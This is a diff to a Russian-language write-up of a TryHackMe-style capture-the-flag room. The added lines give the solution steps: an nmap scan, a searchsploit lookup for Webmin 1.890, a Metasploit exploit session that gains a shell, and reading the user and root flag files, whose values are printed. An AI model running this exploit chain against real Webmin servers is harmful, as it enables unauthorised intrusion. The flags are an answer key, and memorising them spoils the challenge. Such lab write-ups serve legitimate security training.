@@ -15,9 +15,25 @@
 ### Ответьте на вопросы ниже
 пользователь.txt
 ```commandline
+nmap -sV -sC -Pn <IP>
+searchsploit webmin 1.890
+msfconsole
+search webmin
+use 7
+options
+set LHOST tun0
+set RHOSTS <IP>
+exploit
+id
+cat /home/dark/user.txt
+```
+```commandline
 THM{SUPPLY_CHAIN_COMPROMISE}
 ```
 корень.txt
+```commandline
+cat /root/root.txt
+```
 ```commandline
 THM{UPDATE_YOUR_INSTALL}
 ```
